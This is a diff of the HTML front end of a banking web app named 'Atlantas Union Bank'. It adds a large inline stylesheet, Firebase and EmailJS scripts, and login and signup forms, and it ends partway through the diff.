@@ -1,640 +1,1634 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atlas Union Bank</title>
-    
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    
-    <!-- EmailJS -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    
-    <!-- CSS -->
-    <link rel="stylesheet" href="css/styles.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>Atlantas Union Bank</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f0f4f8;color:#111;}
+#auth-screen,#dashboard,#admin-panel{display:none;}
+#auth-screen.visible{display:flex!important;flex-direction:column;align-items:center;background:#f0f4f8;min-height:100vh;padding:40px 20px 80px;overflow-y:auto;}
+#dashboard.visible{display:block!important;background:#f0f4f8;min-height:100vh;overflow:hidden;}
+#admin-panel.visible{display:block!important;background:linear-gradient(180deg,#0a2540 0%,#001022 100%);color:#fff;min-height:100vh;padding:0 0 100px;overflow-y:auto;}
+.auth-logo{text-align:center;margin-bottom:32px;}
+.auth-logo-icon{font-size:56px;display:block;margin-bottom:12px;}
+.auth-logo-name{font-size:24px;font-weight:800;color:#0a2540;letter-spacing:-0.5px;}
+.auth-logo-sub{font-size:13px;color:#888;margin-top:4px;}
+.auth-card{background:#fff;border-radius:20px;padding:28px 24px;width:100%;max-width:400px;box-shadow:0 4px 24px rgba(0,0,0,0.09);margin-bottom:16px;}
+.auth-card h2{font-size:20px;font-weight:800;color:#0a2540;margin-bottom:20px;text-align:center;}
+.auth-card input,.auth-card select{display:block;width:100%;background:#f4f6f9;border:1.5px solid #e2e8f0;border-radius:10px;padding:13px 14px;font-size:15px;color:#111;margin-bottom:10px;font-family:inherit;-webkit-appearance:none;outline:none;}
+.auth-card input:focus,.auth-card select:focus{border-color:#1a56ff;background:#fff;}
+.auth-card input::placeholder{color:#b0b8c8;}
+.auth-card select option{background:#fff;color:#111;}
+.auth-btn{display:block;width:100%;background:#0a2540;color:#fff;border:none;border-radius:12px;padding:15px;font-size:16px;font-weight:700;cursor:pointer;margin-top:4px;font-family:inherit;}
+.toggle-link{display:block;text-align:center;margin-top:14px;color:#1a56ff;background:none;border:none;font-size:14px;cursor:pointer;font-family:inherit;text-decoration:underline;width:100%;padding:6px;}
+.auth-error{color:#e53935;font-size:13px;text-align:center;margin:6px 0;min-height:18px;}
+#globe-btn{position:fixed;bottom:86px;right:16px;width:44px;height:44px;background:#fff;border-radius:50%;display:none;align-items:center;justify-content:center;font-size:22px;border:2px solid #e2e8f0;box-shadow:0 2px 12px rgba(0,0,0,0.12);cursor:pointer;z-index:9999;}
+#globe-btn.show{display:flex;}
+.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:1000;align-items:flex-end;justify-content:center;}
+.modal.show{display:flex;}
+.modal-box{background:#fff;border-radius:24px 24px 0 0;width:100%;max-width:480px;padding:24px 20px 40px;max-height:90vh;overflow-y:auto;}
+.modal-box.center{border-radius:20px;margin:auto;max-height:85vh;}
+.modal-box.dark{background:#111;color:#fff;}
+.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;}
+.modal-header h3{font-size:18px;font-weight:700;color:#0a2540;}
+.modal-box.dark .modal-header h3{color:#fff;}
+.modal-close{background:none;border:none;font-size:26px;color:#666;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;padding:0;line-height:1;}
+.modal-box.dark .modal-close{color:#fff;}
+.modal-input{display:block;width:100%;background:#f4f6f9;border:1.5px solid #e2e8f0;border-radius:10px;padding:13px 14px;font-size:15px;color:#111;margin-bottom:10px;font-family:inherit;outline:none;}
+.modal-box.dark .modal-input{background:rgba(255,255,255,0.08);border:1.5px solid rgba(255,255,255,0.15);color:#fff;}
+.modal-box.dark .modal-input::placeholder{color:rgba(255,255,255,0.35);}
+.modal-box.dark .modal-input:focus{border-color:#4d9fff;}
+.modal-input:focus{border-color:#1a56ff;background:#fff;}
+.modal-input::placeholder{color:#b0b8c8;}
+.modal-btn{display:block;width:100%;background:#0a2540;color:#fff;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;font-family:inherit;}
+.modal-btn.blue{background:#1a56ff;}
+.modal-error{color:#e53935;font-size:13px;margin:4px 0 8px;min-height:16px;}
+.dark-section{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.12);border-radius:14px;padding:16px;margin:14px 0;}
+.dark-section h4{font-size:13px;color:rgba(255,255,255,0.65);margin-bottom:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;}
+.topbar{background:#fff;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;border-bottom:1px solid #e8edf2;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,0.04);}
+.topbar-menu{background:none;border:none;font-size:22px;cursor:pointer;color:#333;width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;padding:0;}
+.topbar-center{display:flex;flex-direction:column;align-items:center;flex:1;}
+.topbar-greeting{font-size:11px;color:#888;}
+.topbar-name{font-size:15px;font-weight:700;color:#0a2540;}
+.topbar-title{font-size:17px;font-weight:700;color:#0a2540;flex:1;text-align:center;}
+.topbar-right{display:flex;align-items:center;}
+.notif-btn{position:relative;background:none;border:none;font-size:22px;cursor:pointer;width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:50%;padding:0;}
+.notif-badge{position:absolute;top:2px;right:2px;background:#e53935;color:#fff;font-size:9px;font-weight:800;min-width:16px;height:16px;border-radius:8px;padding:0 4px;display:none;align-items:center;justify-content:center;}
+.notif-badge.show{display:inline-flex;}
+.tab-page{display:none;min-height:calc(100vh - 60px);padding-bottom:90px;}
+.tab-page.active{display:block;}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #e8edf2;display:flex;justify-content:space-around;padding:8px 0 calc(8px + env(safe-area-inset-bottom));z-index:200;box-shadow:0 -2px 10px rgba(0,0,0,0.06);}
+.nav-btn{background:none;border:none;display:flex;flex-direction:column;align-items:center;gap:2px;cursor:pointer;padding:4px 8px;min-width:56px;color:#888;}
+.nav-btn.active .nav-label,.nav-btn.active .nav-icon{color:#1a56ff;}
+.nav-icon{font-size:20px;}
+.nav-label{font-size:10px;font-weight:500;}
+.nav-center{background:#0a2540;border-radius:50%;width:48px;height:48px;display:flex;align-items:center;justify-content:center;font-size:22px;margin-top:-18px;box-shadow:0 4px 14px rgba(0,0,0,0.3);color:#fff;}
+.drawer{position:fixed;top:0;left:-290px;width:280px;height:100vh;background:#fff;z-index:9998;transition:left 0.28s ease;box-shadow:4px 0 24px rgba(0,0,0,0.15);overflow-y:auto;}
+.drawer.open{left:0;}
+.drawer-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:9997;display:none;}
+.drawer-overlay.open{display:block;}
+.drawer-head{background:linear-gradient(135deg,#0a2540,#1a56ff);padding:48px 20px 24px;color:#fff;}
+.drawer-name{font-size:18px;font-weight:700;}
+.drawer-email{font-size:12px;opacity:0.75;margin-top:3px;}
+.drawer-item{display:flex;align-items:center;gap:14px;padding:16px 20px;border-bottom:1px solid #f4f4f4;font-size:15px;color:#333;cursor:pointer;}
+.drawer-item-icon{font-size:20px;width:28px;text-align:center;}
+.drawer-item.red{color:#e53935;}
+.balance-card{background:#fff;margin:12px 16px;border-radius:16px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,0.08);}
+.balance-label{font-size:13px;color:#666;margin-bottom:6px;display:flex;align-items:center;gap:8px;}
+.acct-badge{background:#eef2ff;color:#1a56ff;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:600;}
+.balance-amount{font-size:40px;font-weight:800;color:#0a2540;letter-spacing:-1.5px;margin-bottom:2px;}
+.balance-sub{font-size:12px;color:#aaa;margin-bottom:16px;}
+.action-row{display:flex;gap:8px;}
+.action-btn{flex:1;display:flex;flex-direction:column;align-items:center;gap:4px;background:#f0f4f8;border:none;border-radius:12px;padding:12px 6px;cursor:pointer;font-size:11px;color:#444;font-weight:600;font-family:inherit;}
+.action-btn:active{background:#e0e8f0;}
+.action-icon{font-size:20px;}
+.verify-banner{background:linear-gradient(90deg,#1a56ff,#0033cc);color:#fff;padding:12px 16px;margin:12px 16px 0;border-radius:12px;display:none;justify-content:space-between;align-items:center;gap:12px;}
+.verify-banner.show{display:flex;}
+.verify-banner-text{font-size:13px;line-height:1.4;}
+.verify-banner-btn{background:#fff;color:#1a56ff;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;white-space:nowrap;flex-shrink:0;}
+.req-banner{background:linear-gradient(90deg,#0a2540,#1a3a60);color:#fff;padding:12px 16px;margin:8px 16px 0;border-radius:12px;display:none;cursor:pointer;}
+.req-banner.show{display:flex;justify-content:space-between;align-items:center;}
+.req-banner-left{font-size:14px;font-weight:700;}
+.req-banner-badge{background:#ff5c5c;color:#fff;font-size:11px;font-weight:800;padding:3px 10px;border-radius:12px;}
+.section{padding:0 16px;margin-top:16px;}
+.section-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;}
+.section-title{font-size:17px;font-weight:700;color:#0a2540;}
+.section-link{background:none;border:none;color:#1a56ff;font-size:14px;font-weight:600;cursor:pointer;padding:0;}
+.cards-stack-wrap{position:relative;margin-bottom:16px;}
+.card-tile{position:absolute;left:0;right:0;height:105px;border-radius:18px;padding:16px 20px;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 8px 24px rgba(0,0,0,0.22);cursor:pointer;transition:transform 0.15s;}
+.card-tile:hover{transform:translateY(-3px);}
+.card-chip{width:30px;height:22px;background:linear-gradient(135deg,#d4a843,#b8872a);border-radius:4px;opacity:0.9;}
+.card-num{font-family:'Courier New',monospace;font-size:14px;font-weight:600;letter-spacing:2px;color:rgba(255,255,255,0.8);}
+.card-expiry-label{font-size:9px;color:rgba(255,255,255,0.5);text-transform:uppercase;}
+.card-expiry-val{font-size:12px;color:rgba(255,255,255,0.8);font-family:monospace;}
+.cards-actions{display:flex;gap:8px;margin-top:8px;}
+.cards-action-btn{flex:1;border:none;border-radius:10px;padding:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;}
+.tx-item{background:#fff;border-radius:12px;padding:14px 16px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
+.tx-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;margin-right:12px;}
+.tx-info{flex:1;}
+.tx-type{font-size:14px;font-weight:600;color:#0a2540;}
+.tx-date{font-size:11px;color:#999;margin-top:2px;}
+.tx-amount{font-size:15px;font-weight:700;}
+.tx-amount.credit{color:#00a550;}
+.tx-amount.debit{color:#e53935;}
+.receipt-card{background:#fff;border-radius:16px;margin-bottom:12px;overflow:hidden;box-shadow:0 1px 8px rgba(0,0,0,0.08);}
+.receipt-head{padding:16px 20px;color:#fff;}
+.receipt-head-label{font-size:11px;opacity:0.8;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;}
+.receipt-head-amount{font-size:26px;font-weight:800;}
+.receipt-head-note{font-size:13px;opacity:0.85;margin-top:2px;}
+.receipt-body{padding:16px 20px;}
+.receipt-row{display:flex;justify-content:space-between;align-items:flex-start;padding:8px 0;border-bottom:1px solid #f0f0f0;font-size:13px;gap:10px;}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-label{color:#888;flex-shrink:0;}
+.receipt-value{font-weight:600;text-align:right;word-break:break-all;}
+.sr-card{background:#fff;border-radius:16px;padding:20px;margin:12px 16px;box-shadow:0 1px 6px rgba(0,0,0,0.07);}
+.sr-label{font-size:16px;font-weight:700;color:#0a2540;margin-bottom:14px;}
+.sr-input{display:block;width:100%;background:#f4f6f9;border:1.5px solid #e2e8f0;border-radius:10px;padding:13px 14px;font-size:14px;color:#111;margin-bottom:10px;font-family:inherit;outline:none;}
+.sr-input:focus{border-color:#1a56ff;background:#fff;}
+.sr-input::placeholder{color:#b0b8c8;}
+.sr-info{background:#eef2ff;border-radius:8px;padding:10px 14px;font-size:13px;color:#1a56ff;margin-bottom:10px;font-weight:600;display:none;}
+.sr-btn{display:block;width:100%;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:4px;}
+.sr-btn.dark{background:#0a2540;color:#fff;}
+.sr-btn.blue{background:#1a56ff;color:#fff;}
+.sr-error{color:#e53935;font-size:13px;min-height:16px;margin:4px 0;}
+.offer-card{background:#fff;border-radius:16px;padding:20px;margin:0 16px 14px;box-shadow:0 1px 6px rgba(0,0,0,0.07);}
+.offer-icon{font-size:36px;margin-bottom:10px;}
+.offer-title{font-size:16px;font-weight:700;color:#0a2540;margin-bottom:6px;}
+.offer-desc{font-size:13px;color:#555;line-height:1.5;margin-bottom:14px;}
+.offer-btn{background:#1a56ff;color:#fff;border:none;border-radius:10px;padding:11px 24px;font-size:14px;font-weight:700;cursor:pointer;}
+.refer-hero{text-align:center;padding:20px 0 16px;}
+.refer-hero-icon{font-size:48px;margin-bottom:8px;}
+.refer-hero-title{font-size:20px;font-weight:700;color:#0a2540;}
+.refer-hero-sub{font-size:14px;color:#666;margin-top:6px;line-height:1.5;}
+.refer-code-box{background:#f0f4f8;border-radius:12px;padding:16px;text-align:center;margin:16px 0;}
+.refer-code{font-size:24px;font-weight:800;color:#1a56ff;letter-spacing:3px;margin-bottom:10px;}
+.refer-copy-btn{background:#1a56ff;color:#fff;border:none;border-radius:8px;padding:10px 24px;font-size:14px;font-weight:600;cursor:pointer;}
+.refer-stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0;}
+.refer-stat{background:#f0f4f8;border-radius:12px;padding:14px;text-align:center;}
+.refer-stat-num{font-size:24px;font-weight:800;color:#1a56ff;}
+.refer-stat-label{font-size:12px;color:#666;margin-top:4px;}
+.refer-bar-wrap{margin:12px 0;}
+.refer-bar-bg{background:#e0e8f0;border-radius:8px;height:8px;overflow:hidden;}
+.refer-bar-fill{background:#1a56ff;height:8px;border-radius:8px;transition:width 0.4s;}
+.refer-bar-label{font-size:12px;color:#666;margin-top:6px;text-align:center;}
+.refer-claim-btn{display:block;width:100%;background:#1a56ff;color:#fff;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px;}
+.refer-claim-btn:disabled{background:#ccc;cursor:not-allowed;}
+.notif-item{padding:14px;border-bottom:1px solid #f0f0f0;cursor:pointer;border-radius:8px;margin-bottom:4px;}
+.notif-item.unread{background:#eef2ff;border-left:3px solid #1a56ff;}
+.notif-msg{font-size:14px;line-height:1.5;color:#111;}
+.notif-time{font-size:11px;color:#999;margin-top:4px;}
+.acct-info-row{display:flex;justify-content:space-between;align-items:flex-start;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;gap:12px;}
+.acct-info-row:last-child{border-bottom:none;}
+.acct-info-label{color:#888;font-size:12px;flex-shrink:0;}
+.acct-info-val{font-weight:600;text-align:right;word-break:break-all;}
+.acct-top-btns{display:flex;gap:8px;margin-bottom:16px;}
+.acct-top-btn{flex:1;background:#f0f4f8;border:1.5px solid #e2e8f0;border-radius:10px;padding:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;color:#0a2540;}
+.card-option{background:#f4f6f9;border:1.5px solid #e2e8f0;border-radius:14px;padding:20px;cursor:pointer;text-align:left;width:100%;margin-bottom:10px;font-family:inherit;}
+.card-option:active{background:#eef2ff;border-color:#1a56ff;}
+.card-option-icon{font-size:32px;margin-bottom:8px;display:block;}
+.card-option-title{font-size:17px;font-weight:700;color:#0a2540;margin-bottom:4px;}
+.card-option-desc{font-size:13px;color:#666;}
+.linked-card{background:#f4f6f9;border-radius:12px;padding:16px;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;border:1px solid #e2e8f0;}
+.linked-card-brand{font-size:13px;font-weight:700;color:#1a56ff;margin-bottom:4px;}
+.linked-card-num{font-size:16px;font-weight:600;font-family:'Courier New',monospace;color:#0a2540;margin-bottom:2px;}
+.linked-card-expiry{font-size:12px;color:#888;}
+.linked-card-status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600;margin-top:6px;}
+.linked-card-status.authorized{background:#e6faf0;color:#00a550;}
+.linked-card-status.pending{background:#fff8e6;color:#e6a817;}
+.linked-card-status.rejected{background:#fee2e2;color:#e53935;}
+.remove-card-btn{background:#fee2e2;color:#e53935;border:none;border-radius:8px;padding:8px 14px;font-size:13px;cursor:pointer;font-family:inherit;flex-shrink:0;}
+.verify-box{background:#0a1628;border:1px solid rgba(77,171,255,0.2);}
+.verify-box .modal-header h3,.verify-box .modal-close{color:#fff;}
+.verify-card-preview{background:linear-gradient(135deg,#1a56ff,#0033cc);border-radius:14px;padding:16px 20px;margin-bottom:16px;}
+.verify-card-brand{font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;opacity:0.7;margin-bottom:8px;color:#fff;}
+.verify-card-number{font-family:'Courier New',monospace;font-size:17px;font-weight:600;letter-spacing:2px;margin-bottom:6px;color:#fff;}
+.verify-card-holder{font-size:13px;opacity:0.65;text-transform:uppercase;color:#fff;}
+.verify-tabs{display:flex;border-radius:10px;overflow:hidden;border:1px solid rgba(255,255,255,0.12);margin-bottom:20px;}
+.vtab{flex:1;padding:11px;text-align:center;font-size:13px;font-weight:600;cursor:pointer;background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.6);}
+.vtab.active{background:rgba(26,86,255,0.4);color:#fff;}
+.vtab:first-child{border-right:1px solid rgba(255,255,255,0.12);}
+.verify-subtitle{font-size:13px;color:rgba(255,255,255,0.65);line-height:1.5;margin-bottom:16px;text-align:center;}
+.verify-steps{display:flex;flex-direction:column;gap:12px;margin-bottom:16px;}
+.verify-step{display:flex;align-items:flex-start;gap:10px;font-size:14px;color:#fff;line-height:1.5;}
+.vstep-num{min-width:26px;height:26px;background:rgba(26,86,255,0.4);border:1px solid rgba(77,171,255,0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;color:#fff;}
+.otp-input{width:100%;background:rgba(255,255,255,0.08);border:2px solid rgba(255,255,255,0.2);border-radius:10px;padding:14px;font-size:24px;text-align:center;letter-spacing:6px;font-family:monospace;color:#fff;outline:none;}
+.otp-input:focus{border-color:#4d9fff;}
+.verify-msg{text-align:center;font-size:14px;min-height:20px;margin-top:10px;}
+.verify-done-btn{display:block;width:100%;background:#0055ff;color:#fff;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px;}
+.addmoney-opt{display:flex;align-items:center;gap:14px;background:#f4f6f9;border:2px solid #e2e8f0;border-radius:12px;padding:14px;cursor:pointer;margin-bottom:10px;}
+.addmoney-opt.selected{border-color:#1a56ff;background:#eef2ff;}
+.addmoney-opt-icon{font-size:24px;}
+.addmoney-opt-label{font-size:14px;font-weight:600;color:#0a2540;}
+.addmoney-opt-sub{font-size:12px;color:#888;}
+.transfer-notice{background:#fff8e6;border-left:3px solid #e6a817;padding:12px;margin-bottom:14px;border-radius:8px;font-size:13px;color:#7a5200;}
+.lang-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:4px;}
+.lang-opt{padding:12px;background:#f4f6f9;border-radius:8px;cursor:pointer;text-align:center;border:1.5px solid #e2e8f0;font-size:14px;color:#111;}
+.lang-opt.active{background:#eef2ff;border-color:#1a56ff;color:#1a56ff;font-weight:600;}
+.more-item{display:flex;align-items:center;gap:12px;padding:16px;background:#f4f6f9;border-radius:12px;cursor:pointer;font-size:15px;color:#111;margin-bottom:8px;border:none;width:100%;font-family:inherit;text-align:left;}
+.more-item-icon{font-size:20px;width:28px;text-align:center;}
+.more-item.red{color:#e53935;}
+.admin-header{text-align:center;padding:24px 16px 16px;}
+.admin-header h2{font-size:22px;font-weight:800;color:#fff;margin-bottom:4px;}
+.admin-header p{font-size:13px;color:rgba(255,255,255,0.5);}
+.admin-tabs{display:flex;gap:8px;padding:0 16px;margin-bottom:20px;flex-wrap:wrap;}
+.admin-tab{background:rgba(255,255,255,0.08);padding:10px 16px;border-radius:12px;cursor:pointer;font-size:13px;font-weight:600;color:rgba(255,255,255,0.65);border:none;font-family:inherit;white-space:nowrap;}
+.admin-tab.active{background:#1a56ff;color:#fff;}
+.admin-content{display:none;padding:0 16px;}
+.admin-content.active{display:block;}
+.acc-block{background:rgba(255,255,255,0.06);border-radius:14px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.1);overflow:hidden;}
+.acc-header{display:flex;justify-content:space-between;align-items:center;padding:16px;cursor:pointer;}
+.acc-header-left{display:flex;align-items:center;gap:10px;}
+.acc-icon-span{font-size:20px;}
+.acc-title-span{font-size:16px;font-weight:600;color:#fff;}
+.acc-badge-span{font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;background:#0055ff;color:#fff;}
+.acc-badge-span.green{background:#34d399;color:#fff;}
+.acc-badge-span.red{background:#ff5c5c;color:#fff;}
+.acc-arrow-span{color:rgba(255,255,255,0.4);font-size:12px;}
+.acc-body{display:none;padding:0 16px 16px;}
+.acc-empty{text-align:center;color:rgba(255,255,255,0.4);padding:16px;font-size:14px;}
+.admin-card{background:rgba(255,255,255,0.05);border-radius:14px;padding:16px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.1);}
+.admin-card-name{font-size:16px;font-weight:700;color:#4dabff;margin-bottom:8px;}
+.admin-detail-row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.05);font-size:13px;color:#fff;gap:8px;}
+.admin-detail-row:last-of-type{border-bottom:none;}
+.admin-detail-label{color:rgba(255,255,255,0.5);font-size:12px;flex-shrink:0;}
+.admin-card-actions{display:flex;gap:8px;margin-top:12px;}
+.admin-action-btn{flex:1;border:none;border-radius:8px;padding:11px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;}
+.admin-action-btn.green{background:#34d399;color:#fff;}
+.admin-action-btn.red{background:#ff5c5c;color:#fff;}
+.admin-action-btn.orange{background:#ff9800;color:#fff;}
+.admin-action-btn.gray{background:#666;color:#fff;}
+.admin-comment{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.15);border-radius:8px;color:#fff;padding:10px;font-size:13px;resize:none;font-family:inherit;margin-top:8px;}
+.admin-section-title{font-size:15px;font-weight:700;color:rgba(255,255,255,0.8);margin:20px 0 12px;padding-bottom:8px;border-bottom:2px solid rgba(255,255,255,0.08);}
+.country-block{margin-bottom:24px;}
+.country-header-row{display:flex;justify-content:space-between;align-items:center;background:rgba(26,86,255,0.15);padding:12px 16px;border-radius:10px;margin-bottom:10px;border-left:3px solid #1a56ff;}
+.country-name{font-size:16px;font-weight:700;color:#4dabff;}
+.country-count{background:rgba(255,255,255,0.1);padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600;color:#fff;}
+.admin-user-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:14px;margin-bottom:10px;border:1px solid rgba(255,255,255,0.08);}
+.admin-user-name{font-size:15px;font-weight:700;color:#4dabff;margin-bottom:6px;}
+.admin-user-detail{font-size:13px;color:rgba(255,255,255,0.75);margin:3px 0;}
+.admin-user-actions{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;}
+.admin-pin-input{background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;padding:10px;font-size:16px;letter-spacing:4px;text-align:center;width:90px;min-width:0;font-family:monospace;outline:none;}
+.admin-logout{display:block;width:calc(100% - 32px);margin:20px 16px 0;background:#e53935;color:#fff;border:none;border-radius:12px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;}
+.admin-global{background:rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1);}
+.admin-global h3{font-size:15px;font-weight:700;color:#fff;margin-bottom:12px;}
+.admin-global-row{display:flex;gap:10px;}
+.admin-global-input{flex:1;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:8px;color:#fff;padding:12px;font-size:18px;letter-spacing:4px;text-align:center;font-family:monospace;outline:none;}
+.admin-global-btn{background:#ff9800;color:#fff;border:none;border-radius:8px;padding:12px 16px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;white-space:nowrap;}
+.deposit-card{background:rgba(255,255,255,0.05);border-radius:14px;padding:16px;margin-bottom:12px;border:1px solid rgba(255,255,255,0.1);}
+.deposit-status{font-size:12px;font-weight:700;padding:3px 10px;border-radius:12px;display:inline-block;margin-bottom:10px;}
+.deposit-status.pending{background:rgba(255,193,7,0.2);color:#ffc107;}
+.deposit-status.approved{background:rgba(52,211,153,0.2);color:#34d399;}
+.deposit-status.rejected{background:rgba(255,92,92,0.2);color:#ff5c5c;}
+.req-item{background:#f4f6f9;border-radius:14px;padding:16px;margin-bottom:12px;border:1px solid #e2e8f0;}
+.req-from{font-size:15px;font-weight:700;color:#0a2540;margin-bottom:4px;}
+.req-amount{font-size:20px;font-weight:800;color:#1a56ff;}
+.req-note{font-size:13px;color:#555;font-style:italic;margin:4px 0;}
+.req-date{font-size:11px;color:#aaa;}
+.req-btns{display:flex;gap:8px;margin-top:12px;}
+.req-accept{flex:1;background:#00a550;color:#fff;border:none;border-radius:10px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;}
+.req-decline{flex:1;background:#fee2e2;color:#e53935;border:none;border-radius:10px;padding:12px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit;}
+.sendreq-option-btn{display:block;width:100%;background:#fff;border:2px solid #e2e8f0;border-radius:18px;padding:24px 20px;margin-bottom:14px;cursor:pointer;text-align:center;font-family:inherit;transition:all 0.18s;box-shadow:0 2px 8px rgba(0,0,0,0.06);}
+.sendreq-option-btn:active,.sendreq-option-btn:hover{border-color:#1a56ff;background:#f0f5ff;transform:translateY(-2px);box-shadow:0 6px 18px rgba(26,86,255,0.12);}
+</style>
 </head>
 <body>
 
-    <!-- Language Selector Button -->
-    <div class="language-selector" id="language-selector">🌐</div>
+<div id="globe-btn" onclick="openModal('language-modal')">&#127760;</div>
 
-    <!-- Drawer Overlay -->
-    <div class="drawer-overlay" id="drawer-overlay"></div>
+<!-- AUTH -->
+<div id="auth-screen">
+  <div class="auth-logo">
+    <span class="auth-logo-icon">&#127974;</span>
+    <div class="auth-logo-name">Atlantas Union Bank</div>
+    <div class="auth-logo-sub">Secure &middot; Reliable &middot; Global</div>
+  </div>
+  <div class="auth-card" id="login-section">
+    <h2>Welcome Back</h2>
+    <input type="email" id="li-email" placeholder="Email address" autocomplete="email">
+    <input type="password" id="li-password" placeholder="Password" autocomplete="current-password">
+    <div class="auth-error" id="login-error"></div>
+    <button class="auth-btn" id="login-btn">Log In</button>
+    <button class="toggle-link" id="to-signup">Don&#39;t have an account? Sign Up</button>
+  </div>
+  <div class="auth-card" id="signup-section" style="display:none;">
+    <h2>Create Account</h2>
+    <input type="text" id="su-surname" placeholder="Surname">
+    <input type="text" id="su-firstname" placeholder="First Name">
+    <input type="text" id="su-othername" placeholder="Other Name (optional)">
+    <input type="tel" id="su-phone" placeholder="Phone Number">
+    <input type="text" id="su-username" placeholder="Username">
+    <input type="email" id="su-email" placeholder="Email Address">
+    <input type="password" id="su-password" placeholder="Password (min 8 chars)">
+    <input type="password" id="su-confirm" placeholder="Confirm Password">
+    <select id="su-currency">
+      <option value="USD">&#127482;&#127480; USD - US Dollar</option>
+      <option value="EUR">&#127466;&#127482; EUR - Euro</option>
+      <option value="GBP">&#127468;&#127463; GBP - British Pound</option>
+      <option value="NGN">&#127475;&#127468; NGN - Nigerian Naira</option>
+      <option value="CAD">&#127464;&#127462; CAD - Canadian Dollar</option>
+      <option value="AUD">&#127462;&#127482; AUD - Australian Dollar</option>
+    </select>
+    <select id="su-country">
+      <option value="">Select Country</option>
+      <option value="USA">&#127482;&#127480; United States</option>
+      <option value="UK">&#127468;&#127463; United Kingdom</option>
+      <option value="Nigeria">&#127475;&#127468; Nigeria</option>
+      <option value="Germany">&#127465;&#127466; Germany</option>
+      <option value="France">&#127467;&#127479; France</option>
+      <option value="Canada">&#127464;&#127462; Canada</option>
+      <option value="Brazil">&#127463;&#127479; Brazil</option>
+      <option value="Australia">&#127462;&#127482; Australia</option>
+      <option value="Other">&#127757; Other</option>
+    </select>
+    <input type="text" id="su-promo" placeholder="Promo Code (optional)">
+    <input type="text" id="su-referral" placeholder="Referral Code (optional)">
+    <div class="auth-error" id="signup-error"></div>
+    <button class="auth-btn" id="signup-btn">Create Account</button>
+    <button class="toggle-link" id="to-login">Already have an account? Log In</button>
+  </div>
+</div>
 
-    <!-- Side Drawer -->
-    <div class="side-drawer" id="side-drawer">
-        <div class="drawer-header">
-            <div class="drawer-header-icon">🏦</div>
